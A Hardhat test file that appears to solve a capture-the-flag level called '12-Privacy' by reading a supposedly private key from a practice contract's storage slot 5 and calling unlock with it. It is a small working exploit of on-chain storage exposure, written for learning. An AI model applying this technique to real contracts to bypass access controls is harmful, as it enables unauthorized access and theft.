const { assert } = require("chai")
const { deployments, ethers } = require("hardhat")

describe("12-Privacy", async function () {
    let deployer, attacker, privacy
    beforeEach(async function () {
        accounts = await ethers.getSigners()
        deployer = accounts[0]
        attacker = accounts[1]
        await deployments.fixture(["12"])
        privacy = await ethers.getContract("Privacy")
    })
    it("should unlock the contract", async function () {
        function toBytes16(bytes32String) {
            return bytes32String.slice(0, 34)
        }
        // get key
        // 3 state variables occupy the same slot in storage
        // (flattening, denomination, awkwardness)
        // so key (data[2]) is located at position 5
        const key = await ethers.provider.getStorageAt(privacy.address, 5)
        // convert from bytes32 to bytes16 and unlock
        await privacy.unlock(toBytes16(key))
        assert(!(await privacy.locked()))
    })
})
